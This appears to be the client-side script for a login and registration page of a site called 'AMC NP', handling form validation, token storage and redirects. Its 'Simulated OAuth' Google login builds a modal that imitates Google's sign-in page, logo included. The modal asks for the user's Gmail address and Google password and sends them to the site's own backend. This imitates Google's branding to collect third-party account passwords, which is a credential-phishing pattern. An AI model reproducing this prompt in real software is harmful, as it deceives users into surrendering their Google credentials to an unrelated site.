// REMOVED localStorage demo init - now using backend API

const tabs = document.querySelectorAll('.tab');
const forms = document.querySelectorAll('.form');

tabs.forEach(tab => {
    tab.addEventListener('click', () => {
        tabs.forEach(t => t.classList.remove('active'));
        forms.forEach(f => f.classList.remove('active'));
        tab.classList.add('active');
        document.getElementById(tab.dataset.tab + 'Form').classList.add('active');
        hideMessage();
    });
});

document.querySelectorAll('.toggle-password').forEach(icon => {
    icon.addEventListener('click', () => {
        const target = document.getElementById(icon.dataset.target);
        if (target.type === 'password') {
            target.type = 'text';
            icon.classList.replace('fa-eye', 'fa-eye-slash');
        } else {
            target.type = 'password';
            icon.classList.replace('fa-eye-slash', 'fa-eye');
        }
    });
});

function showMessage(text, type) {
    const msg = document.getElementById('message');
    msg.textContent = text;
    msg.className = 'message ' + type;
    setTimeout(() => hideMessage(), 4000);
}

function hideMessage() {
    const msg = document.getElementById('message');
    msg.className = 'message';
    msg.textContent = '';
}

function validateEmail(email) {
    return /^[^\s@]+@[^\s@]+\.[^\s@]+$/.test(email);
}

document.getElementById('loginForm').addEventListener('submit', async (e) => {
    e.preventDefault();
    const email = document.getElementById('loginEmail').value.trim();
    const password = document.getElementById('loginPassword').value;

    if (!validateEmail(email)) { showMessage('Please enter a valid email', 'error'); return; }
    if (password.length < 6) { showMessage('Password must be at least 6 characters', 'error'); return; }

    const button = e.target.querySelector('.btn-primary');
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Logging in...';
    button.disabled = true;

    const result = await Auth.login({ email, password });
    if (result.error) {
        showMessage(result.error, 'error');
        button.innerHTML = '<i class="fas fa-sign-in-alt"></i> Login';
        button.disabled = false;
        return;
    }

    localStorage.setItem('amc_token', result.token);
    localStorage.setItem('currentUser', JSON.stringify(result.user));
    showMessage('Login successful! Redirecting...', 'success');
    setTimeout(() => window.location.href = 'dashboard.html', 1500);
});

document.getElementById('registerForm')?.addEventListener('submit', async (e) => {
    e.preventDefault();
    const name = document.getElementById('regName').value.trim();
    const email = document.getElementById('regEmail').value.trim();
    const phone = document.getElementById('regPhone').value.trim();
    const password = document.getElementById('regPassword').value;
    const role = document.getElementById('regRole').value;
    const agreed = document.getElementById('agreeTerms').checked;

    if (!validateEmail(email)) { showMessage('Please enter a valid email', 'error'); return; }
    if (password.length < 6) { showMessage('Password must be at least 6 characters', 'error'); return; }
    if (!/^[0-9]{10}$/.test(phone)) { showMessage('Please enter a valid 10-digit phone number', 'error'); return; }
    if (!agreed) { showMessage('Please agree to the Terms & Conditions', 'error'); return; }

    const button = e.target.querySelector('.btn-primary');
    button.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Creating...';
    button.disabled = true;

    const result = await Auth.register({ name, email, phone, password, role });
    if (result.error) {
        showMessage(result.error, 'error');
        button.innerHTML = '<i class="fas fa-user-plus"></i> Register';
        button.disabled = false;
        return;
    }

    localStorage.setItem('amc_token', result.token);
    localStorage.setItem('currentUser', JSON.stringify(result.user));
    showMessage('Account created! Redirecting...', 'success');
    setTimeout(() => window.location.href = 'dashboard.html', 1500);
});

// GOOGLE LOGIN (Simulated OAuth flow)
document.getElementById('googleLoginBtn').addEventListener('click', () => {
    openGoogleModal();
});

function openGoogleModal() {
    const existing = document.getElementById('googleModal');
    if (existing) existing.remove();

    const modal = document.createElement('div');
    modal.id = 'googleModal';
    modal.className = 'google-modal';
    modal.innerHTML = `
        <div class="google-modal-box">
            <div class="google-header">
                <img src="https://www.gstatic.com/firebasejs/ui/2.0.0/images/auth/google.svg" alt="Google" onerror="this.style.display='none'">
                <i class="fab fa-google google-icon-fallback" style="display:none"></i>
                <h3>Sign in with Google</h3>
                <p>to continue to <b>AMC NP</b></p>
            </div>
            <div class="google-body">
                <label>Email</label>
                <input type="email" id="googleEmail" placeholder="Enter your Gmail address" value="">

                <label>Password</label>
                <input type="password" id="googlePassword" placeholder="Enter your password">

                <p class="google-info">Not your computer? Use Guest mode to sign in privately.</p>

                <div class="google-actions">
                    <button class="google-cancel" id="googleCancel">Cancel</button>
                    <button class="google-next" id="googleNext">Next</button>
                </div>
            </div>
        </div>
    `;
    document.body.appendChild(modal);
    setTimeout(() => modal.classList.add('active'), 10);
    document.getElementById('googleEmail').focus();

    document.getElementById('googleCancel').onclick = () => closeGoogleModal(modal);
    document.getElementById('googleNext').onclick = () => submitGoogleLogin(modal);
    modal.onclick = (e) => { if (e.target === modal) closeGoogleModal(modal); };
}

function closeGoogleModal(modal) {
    modal.classList.remove('active');
    setTimeout(() => modal.remove(), 200);
}

function submitGoogleLogin(modal) {
    const email = document.getElementById('googleEmail').value.trim();
    const password = document.getElementById('googlePassword').value;

    if (!email || !email.includes('@gmail.com')) { showMessage('Please enter a valid Gmail address', 'error'); return; }
    if (!password) { showMessage('Please enter your password', 'error'); return; }

    const nextBtn = document.getElementById('googleNext');
    nextBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i>';
    nextBtn.disabled = true;

    Auth.google({ email, password }).then(result => {
        if (result.error) {
            showMessage(result.error, 'error');
            nextBtn.innerHTML = 'Next';
            nextBtn.disabled = false;
            return;
        }
        localStorage.setItem('amc_token', result.token);
        localStorage.setItem('currentUser', JSON.stringify(result.user));
        closeGoogleModal(modal);
        showMessage('Google login successful! Redirecting...', 'success');
        setTimeout(() => window.location.href = 'dashboard.html', 1500);
    });
}
